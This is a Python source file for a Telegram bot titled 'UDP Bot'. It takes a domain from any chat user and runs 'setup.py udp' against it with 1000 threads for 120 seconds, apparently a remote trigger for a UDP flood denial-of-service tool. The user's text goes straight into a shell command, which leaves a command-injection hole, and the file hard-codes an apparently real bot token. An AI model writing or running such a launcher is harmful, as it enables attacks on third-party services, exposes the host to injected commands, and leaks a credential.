import telebot
import subprocess

# Replace 'YOUR_API_KEY' with your actual bot token
API_TOKEN = '7129718094:AAGAX62hkUEwAhbS9O3vm9HJmAOSwap6kQY'

bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome to the UDP Bot! Use the command /run to start.")

@bot.message_handler(commands=['run'])
def handle_run(message):
    msg = bot.reply_to(message, "Please provide the domain.")
    bot.register_next_step_handler(msg, process_domain)

def process_domain(message):
    try:
        domain = message.text
        udp = 'udp'
        thread = '1000'
        time = '120'

        # Command to be executed
        command = f"python setup.py {udp} '{domain}' {thread} {time}"
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()

        if process.returncode == 0:
            bot.reply_to(message, f"Command executed successfully:\n{output.decode('utf-8')}")
        else:
            bot.reply_to(message, f"Error executing command:\n{error.decode('utf-8')}")

    except Exception as e:
        bot.reply_to(message, f"Error processing domain: {str(e)}")

bot.polling()
